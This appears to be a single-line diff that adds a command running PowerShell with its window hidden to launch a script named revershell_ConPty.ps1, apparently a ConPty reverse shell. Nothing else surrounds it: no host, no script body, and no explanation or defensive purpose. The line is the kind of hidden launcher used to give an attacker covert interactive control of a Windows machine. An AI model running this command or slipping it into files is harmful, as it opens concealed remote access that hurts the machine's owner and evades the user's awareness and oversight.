@@ -1,0 +1,1 @@
+powershell.exe -windowstyle hidden .\revershell_ConPty.ps1
